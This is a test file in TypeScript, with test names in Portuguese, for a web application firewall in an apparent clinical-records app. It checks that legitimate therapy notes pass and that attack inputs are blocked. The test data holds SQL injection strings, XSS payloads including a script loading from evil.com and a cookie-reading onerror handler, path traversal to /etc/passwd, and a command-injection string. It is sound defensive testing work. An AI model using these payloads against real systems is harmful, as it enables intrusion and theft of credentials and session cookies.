import { describe, it, expect } from 'bun:test';
import { inspectPayload, WAF_RULES_CATALOG } from '../src/waf';
import { WafAttackType } from '@terapiainfoco/shared';

describe('Web Application Firewall (WAF) Engine - RFC-001 §4.4, §5.2', () => {
  describe('Detecção de SQL Injection (SQLi)', () => {
    it('deve permitir dados clínicos legítimos sem falso-positivo', () => {
      const legitimateSoap = {
        patientId: 'pat-123',
        subjective: 'Paciente relata melhora na ansiedade após técnicas de respiração.',
        objective: 'Discurso coerente, humor estável e contato visual preservado.',
        assessment: 'Evolução favorável do quadro depressivo leve (F32.0).',
        plan: 'Manter sessões semanais e exercícios de diário de pensamentos.'
      };

      const result = inspectPayload(legitimateSoap);
      expect(result.passed).toBe(true);
      expect(result.threatScore).toBe(0);
      expect(result.matchedRules).toHaveLength(0);
      expect(result.actionTaken).toBe('PASSED');
    });

    it('deve detectar Union-based SQLi em campo de texto ou id', () => {
      const payload = {
        search: "1' UNION SELECT null, username, password FROM users--"
      };

      const result = inspectPayload(payload);
      expect(result.passed).toBe(false);
      expect(result.threatScore).toBeGreaterThanOrEqual(95);
      expect(result.matchedRules.some(r => r.category === WafAttackType.SQL_INJECTION)).toBe(true);
      expect(result.actionTaken).toBe('BLOCKED');
    });

    it('deve detectar tautologia booleana (OR 1=1)', () => {
      const payload = {
        cpf: "12345678901' OR '1'='1"
      };

      const result = inspectPayload(payload);
      expect(result.passed).toBe(false);
      expect(result.threatScore).toBeGreaterThanOrEqual(90);
    });

    it('deve detectar instruções destrutivas DDL (DROP TABLE)', () => {
      const payload = {
        observation: "DROP TABLE therapists;--"
      };

      const result = inspectPayload(payload);
      expect(result.passed).toBe(false);
      expect(result.matchedRules.some(r => r.ruleId === 'WAF-SQLI-003')).toBe(true);
    });

    it('deve detectar time-based blind SQLi (WAITFOR DELAY / SLEEP)', () => {
      const payload = {
        name: "test'; WAITFOR DELAY '0:0:5'--"
      };

      const result = inspectPayload(payload);
      expect(result.passed).toBe(false);
      expect(result.matchedRules.some(r => r.ruleId === 'WAF-SQLI-005')).toBe(true);
    });
  });

  describe('Detecção de Cross-Site Scripting (XSS)', () => {
    it('deve detectar tags <script> com atributos ou espaços', () => {
      const payload = {
        anamnese: "Paciente refere: <script src='http://evil.com/xss.js'></script>"
      };

      const result = inspectPayload(payload);
      expect(result.passed).toBe(false);
      expect(result.threatScore).toBeGreaterThanOrEqual(95);
      expect(result.matchedRules.some(r => r.category === WafAttackType.CROSS_SITE_SCRIPTING)).toBe(true);
    });

    it('deve detectar manipuladores de eventos inline (onerror / onload)', () => {
      const payload = {
        avatarUrl: "<img src='x' onerror='alert(document.cookie)' />"
      };

      const result = inspectPayload(payload);
      expect(result.passed).toBe(false);
      expect(result.matchedRules.some(r => r.ruleId === 'WAF-XSS-003' || r.ruleId === 'WAF-XSS-004')).toBe(true);
    });

    it('deve detectar pseudo-protocolo javascript:', () => {
      const payload = {
        website: "javascript:alert(1)"
      };

      const result = inspectPayload(payload);
      expect(result.passed).toBe(false);
      expect(result.matchedRules.some(r => r.ruleId === 'WAF-XSS-002')).toBe(true);
    });

    it('deve neutralizar evasão por HTML Entities e Double URL Encoding', () => {
      // %253Cscript%253E -> %3Cscript%3E -> <script>
      const payload = {
        note: "%253Cscript%253Ealert('xss')%253C/script%253E"
      };

      const result = inspectPayload(payload);
      expect(result.passed).toBe(false);
      expect(result.matchedRules.some(r => r.ruleId === 'WAF-XSS-001')).toBe(true);
    });
  });

  describe('Detecção de Path Traversal & Command Injection', () => {
    it('deve detectar Directory Traversal (../)', () => {
      const payload = {
        filename: "../../../etc/passwd"
      };

      const result = inspectPayload(payload);
      expect(result.passed).toBe(false);
      expect(result.matchedRules.some(r => r.category === WafAttackType.PATH_TRAVERSAL)).toBe(true);
    });

    it('deve detectar Command Injection encadeado (; cat /etc/passwd)', () => {
      const payload = {
        query: "test; cat /etc/passwd"
      };

      const result = inspectPayload(payload);
      expect(result.passed).toBe(false);
      expect(result.matchedRules.some(r => r.category === WafAttackType.COMMAND_INJECTION)).toBe(true);
    });
  });

  describe('Inspeção em Estruturas Profundas e Respeito a Thresholds', () => {
    it('deve inspecionar objetos aninhados e arrays', () => {
      const nested = {
        level1: {
          level2: [
            { normal: 'ok' },
            { attack: "<script>alert('pwn')</script>" }
          ]
        }
      };

      const result = inspectPayload(nested);
      expect(result.passed).toBe(false);
      expect(result.matchedRules[0].fieldPath).toContain('attack');
    });

    it('deve permitir ajustar blockThreshold customizado', () => {
      const payload = {
        comment: "-- comentario sql com risco medio"
      };

      // Limiar padrão (70) deixa passar
      const defaultRes = inspectPayload(payload, { blockThreshold: 70 });
      expect(defaultRes.passed).toBe(true);
      expect(defaultRes.threatScore).toBe(40);

      // Limiar estrito (30) bloqueia
      const strictRes = inspectPayload(payload, { blockThreshold: 30 });
      expect(strictRes.passed).toBe(false);
      expect(strictRes.actionTaken).toBe('BLOCKED');
    });
  });
});
